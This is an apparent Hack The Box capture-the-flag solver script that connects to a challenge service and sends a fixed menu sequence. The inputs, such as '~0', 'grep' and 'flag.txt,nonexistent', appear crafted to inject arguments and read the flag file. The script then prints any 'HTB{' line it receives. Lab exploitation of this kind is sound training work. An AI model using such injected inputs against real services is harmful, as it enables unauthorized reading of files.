#!/usr/bin/env python3
# auto_client.py
import socket
import select
import time

HOST, PORT = 'IP', PORT

commands = ['1', '~0', '2', 'grep', '3', 'flag.txt,nonexistent', '4', 'aaaaaaaaaaaa,bbbbbbbbbbbb', '5']

PROMPT_PATTERNS = ['\n> ', '\r\n> ', '\n>', '\r\n>', '> ']

def has_prompt(accumulated_text: str) -> bool:
    """Return True if any of the known prompt patterns appears in accumulated_text."""
    if not accumulated_text:
        return False
    for patt in PROMPT_PATTERNS:
        if patt in accumulated_text:
            return True
    return False

def main():
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    try:
        sock.connect((HOST, PORT))
        sock.setblocking(False)
    except Exception as e:
        print(f"[connect error] {e}")
        return

    recv_accum = []
    recv_buffer = ""
    cmd_index = 0
    max_idle = 30.0
    last_recv_time = time.time()

    try:
        while True:
            rlist, _, _ = select.select([sock], [], [], 0.5)

            if sock in rlist:
                try:
                    data = sock.recv(4096)
                except Exception as e:
                    #print(f"[recv error] {e}")
                    break

                if not data:
                    print("[connection closed by remote]")
                    break

                text = data.decode(errors='replace')
                recv_buffer += text
                last_recv_time = time.time()
                
                if('HTB{' in text):
                    print(text.split('\n')[0])


            if cmd_index < len(commands) and has_prompt(recv_buffer):
                cmd = commands[cmd_index]
                to_send = (cmd + '\n').encode()
                try:
                    sock.sendall(to_send)
                    #print(f"[sent command #{cmd_index+1}: {cmd}]")
                except Exception as e:
                    print(f"[send error] {e}")
                    break

                cmd_index += 1
                recv_buffer = ""

            if cmd_index >= len(commands):
                if time.time() - last_recv_time > 2.0:
                    try:
                        while True:
                            data = sock.recv(4096)
                            if not data:
                                break
                            text = data.decode(errors='replace')
                            print(text, end='')
                            last_recv_time = time.time()
                    except BlockingIOError:
                        pass
                    break

            if time.time() - last_recv_time > max_idle:
                print("[timeout: no data received for a while — exiting]")
                break

    finally:
        try:
            sock.close()
        except:
            pass

if __name__ == "__main__":
    main()
